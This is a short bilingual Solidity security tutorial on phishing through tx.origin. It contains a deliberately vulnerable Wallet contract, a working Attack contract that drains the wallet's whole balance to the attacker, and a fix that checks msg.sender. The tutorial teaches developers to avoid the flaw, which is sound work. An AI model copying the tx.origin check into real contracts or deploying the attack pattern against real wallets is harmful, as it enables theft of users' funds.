## 带有 tx.origin 的网络钓鱼
msg.sender和 和有什么区别tx.origin？
如果合约A调用B，B调用C，则C中msg.sender是B，tx.origin是A。

漏洞
恶意合约可以欺骗合约所有者调用只有所有者才能调用的函数。

What's the difference between msg.sender and tx.origin?
If contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A.

Vulnerability
A malicious contract can deceive the owner of a contract into calling a function that only the owner should be able to call.
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice's Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice's wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

### 预防技术
使用msg.sender而不是tx.origin

Preventative Techniques
Use msg.sender instead of tx.origin
```js
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{ value: _amount }("");
  require(sent, "Failed to send Ether");
}
```
